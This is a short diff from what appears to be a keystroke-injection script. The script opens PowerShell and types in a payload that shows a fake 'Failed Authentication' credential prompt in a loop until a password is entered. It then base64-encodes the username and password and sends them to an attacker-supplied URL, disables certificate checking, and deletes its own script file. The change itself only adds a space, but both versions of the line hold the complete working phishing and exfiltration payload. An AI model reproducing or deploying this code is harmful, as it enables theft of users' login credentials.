@@ -12,7 +12,7 @@ press("GUI r")
 delay(500);
 type("powershell\n")
 delay(500)
-type("$popup = \"while (`$true){`$cred = `$host.ui.promptforcredential(`'Failed Authentication`',`'`',[Environment]::UserDomainName + `\"\\`\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};if (`$cred.getnetworkcredential().password) {break :DoLoop}};`$Text = `$cred.username + `\":`\" + `$cred.getnetworkcredential().password;`$Bytes = [System.Text.Encoding]::Unicode.GetBytes(`$Text);`$EncodedText =[Convert]::ToBase64String(`$Bytes);Invoke-WebRequest -UseBasicParsing -Uri " + URL + "/`$EncodedText; rm $Env:UserProfile\\popup.ps1\"\n")
+type("$popup = \"while (`$true){`$cred = `$host.ui.promptforcredential(`'Failed Authentication`',`'`',[Environment]::UserDomainName + `\"\\`\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};if (`$cred.getnetworkcredential().password) {break :DoLoop}};`$Text = `$cred.username + `\":`\" + `$cred.getnetworkcredential().password;`$Bytes = [System.Text.Encoding]::Unicode.GetBytes(`$Text);`$EncodedText =[Convert]::ToBase64String(`$Bytes);Invoke-WebRequest -UseBasicParsing -Uri " + URL + "/`$EncodedText; rm $Env:UserProfile\\popup.ps1\" \n")
 delay(500)
 type("echo $popup > $Env:UserProfile\\popup.ps1\n")
 delay(1000)
